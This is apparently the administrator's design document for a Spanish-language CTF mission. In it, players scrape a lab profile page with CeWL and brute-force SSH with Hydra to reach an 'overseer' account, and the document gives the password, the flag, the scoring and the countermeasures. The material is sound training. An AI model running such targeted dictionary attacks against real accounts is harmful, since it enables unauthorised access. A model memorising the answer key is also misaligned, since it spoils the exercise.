# Misión 2 — El Supervisor

## Resumen administrativo

- Dificultad: inicial-media
- Puntuación: 1.000
- Acceso inicial: SSH como `maint217` y terminal web
- Usuario objetivo: `ncole`
- Contraseña: `SunsetSarsaparilla`
- Flag: `VaultTec{Overseer_Access_Granted}`
- Continuidad: incidente 184, transmisión Base64 y evidencia de red

## Objetivo narrativo

El acceso de mantenimiento confirma que Vault 217 sigue parcialmente operativo. Una orden de trabajo indica que el Supervisor Nathan Cole utilizaba acceso remoto y contraseñas relacionadas con sus intereses personales. El participante debe correlacionar la información interna con el directorio público, construir un ataque de diccionario dirigido y obtener acceso a la cuenta del Supervisor.

## Situación inicial

Gracias a Misión 1, el participante conoce:

```text
Nombre: Nathan Cole
Personnel ID: OVR-001
Convención: primera inicial + apellido
Usuario deducido: ncole
Pista: contraseñas derivadas de intereses personales
```

También dispone de:

- acceso SSH como `maint217`;
- acceso al terminal público;
- conocimiento de que SSH acepta autenticación mediante contraseña.

## Cadena técnica

```text
WO-217-184.txt
  → Nathan Cole + convención
ncole
  → directorio de personal
nathan-cole.html
  → información personal
CeWL
  → cole.txt
Hydra contra SSH
  → SunsetSarsaparilla
SSH como ncole
  → Flag 2
incident-184.txt
  → transmisión + captura
Misión 3
```

## Perfil público

Ruta:

```text
/personnel/nathan-cole.html
```

Información expuesta:

```text
Employee ID: OVR-001
Position: Vault 217 Overseer
Hometown: Boston
Favorite pre-war beverage: SunsetSarsaparilla
Favorite baseball team: Boston Red Sox
Pet: Dogmeat
Favorite radio station: Galaxy News Radio
```

La página incluye además una advertencia para no reutilizar palabras del perfil en contraseñas. Nathan ignoró esa política.

## Diccionario dirigido

El flujo previsto utiliza:

```bash
cewl http://VAULT_IP/personnel/nathan-cole.html -w cole.txt
```

La contraseña real aparece exactamente en la página y, por tanto, en el diccionario:

```text
SunsetSarsaparilla
```

El objetivo no es ejecutar una fuerza bruta masiva, sino comprender que un diccionario contextual puede ser más efectivo que una lista genérica.

## Ataque controlado

```bash
hydra -l ncole -P cole.txt ssh://VAULT_IP
```

Resultado esperado:

```text
login: ncole
password: SunsetSarsaparilla
```

SSH permite suficientes intentos para el ejercicio. Fail2ban no está instalado deliberadamente.

## Cuenta del Supervisor

```text
Usuario: ncole
Contraseña: SunsetSarsaparilla
Shell: /bin/bash
Grupo suplementario: overseer
Sudo: no
Acceso al informe plano AURORA: no
```

El grupo `overseer` se utiliza posteriormente para conceder acceso de solo lectura a las capturas y archivos cifrados necesarios para Misiones 3 y 5.

Estructura del home:

```text
/home/ncole/
├── flag2.txt
├── messages/
│   ├── shaw-message.txt
│   └── security-warning.txt
├── personal/
│   └── diary.txt
├── security/
│   ├── incident-181.txt
│   └── incident-184.txt
├── transmissions/
│   ├── transmission.b64
│   └── transmission.sha256
└── system_archive/
    └── material reservado para Misión 5
```

Los archivos de Misión 5 pueden existir en el sistema, pero no son necesarios ni comprensibles hasta recuperar el material criptográfico de Misión 4.

## Flag 2

Ruta:

```text
/home/ncole/flag2.txt
```

Contenido:

```text
VaultTec{Overseer_Access_Granted}
```

## Continuidad hacia Misión 3

`security/incident-184.txt` explica que:

- JANUS inició un lockdown no autorizado de Research Level B;
- Eleanor Shaw afirmó que el sistema cambió sus controles;
- Marcus intentó transmitir evidencia;
- la transmisión fue interceptada;
- Seguridad capturó tráfico de vigilancia.

Archivos recuperados:

```text
transmission.b64
transmission.sha256
```

La combinación de nombres y extensiones permite formular la siguiente hipótesis:

```text
.b64    → representación codificada
.sha256 → comprobación de integridad
```

El incidente no indica los comandos que deben utilizarse. El participante debe reconocer los formatos y decidir copiar las evidencias mediante SCP.

## Puntuación sugerida

| Acción | Puntos |
|---|---:|
| Deducir el usuario `ncole` | 100 |
| Localizar el perfil público | 100 |
| Identificar información útil | 100 |
| Generar un diccionario con CeWL | 150 |
| Ejecutar el ataque controlado | 200 |
| Acceder mediante SSH | 100 |
| Recuperar Flag 2 | 100 |
| Interpretar el incidente y las evidencias | 150 |
| **Total** | **1.000** |

## Debilidades controladas

### Contraseña basada en información pública

La contraseña coincide con una preferencia publicada en el perfil del usuario.

### Intentos SSH sin protección adicional

El servicio permite suficientes intentos para que un ataque dirigido mediante Hydra sea viable.

### Riesgos

- compromiso de cuentas privilegiadas;
- acceso a información interna;
- movimiento lateral;
- ataques de diccionario y password spraying;
- acceso a evidencias y archivos cifrados.

### Contramedidas esperadas

- contraseñas aleatorias y únicas;
- gestores de contraseñas;
- prohibir secretos derivados de información personal;
- autenticación SSH mediante claves;
- MFA cuando corresponda;
- limitación y bloqueo temporal de intentos;
- Fail2ban o controles equivalentes;
- monitoreo y alertas sobre autenticaciones fallidas.

## Conceptos evaluados

- correlación de evidencias;
- construcción de nombres de usuario;
- recopilación de información pública;
- diccionarios personalizados;
- CeWL;
- Hydra;
- autenticación remota;
- separación de privilegios;
- transición hacia análisis forense.

## After Action Report

El participante debe explicar:

- cómo dedujo `ncole` sin recibirlo directamente;
- por qué regresó al directorio de personal;
- qué palabras del perfil eran relevantes;
- por qué utilizó CeWL;
- diferencia entre fuerza bruta genérica y diccionario dirigido;
- qué debilidades hicieron posible Hydra;
- qué privilegios obtuvo y cuáles no;
- cómo `incident-184.txt` y las extensiones de los archivos conducen a Misión 3.

## Insignia

### Supervisor Fantasma

Demuestra recopilación de información, construcción de diccionarios, análisis de contraseñas, ataque controlado de autenticación y acceso remoto con una cuenta de mayor nivel.

## Validación administrativa

`verify-vault217.sh` comprueba:

- existencia de `ncole`;
- ausencia de acceso a sudo;
- pertenencia al grupo `overseer`;
- presencia de `SunsetSarsaparilla` en el perfil;
- valor de Flag 2;
- aislamiento frente a `maint217`;
- ausencia de acceso al informe plano de AURORA;
- existencia e integridad de las evidencias que inician Misión 3.

`reset-vault217.sh` restaura la contraseña, el home, las evidencias, los permisos y la membresía de grupo.
